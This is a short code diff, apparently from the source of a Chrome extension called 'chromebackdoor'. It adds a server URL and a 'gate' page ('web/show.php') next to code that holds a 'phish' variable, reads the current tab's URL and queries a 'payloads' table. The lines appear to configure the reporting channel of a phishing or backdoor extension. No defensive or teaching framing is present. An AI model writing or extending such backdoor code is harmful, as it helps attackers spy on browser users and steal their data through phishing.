@@ -6,7 +6,8 @@ $(document).ready(function()
     var phish = "";
     var tabURL = window.location.href;
     
-    //settings
+    var server_web = 'http://localhost:8888/taff/private/chromebackdoor/'
+ var gate_page = 'web/show.php'
     
     <?php
     $select_url_check = $bdd->prepare("SELECT urlverif FROM payloads");
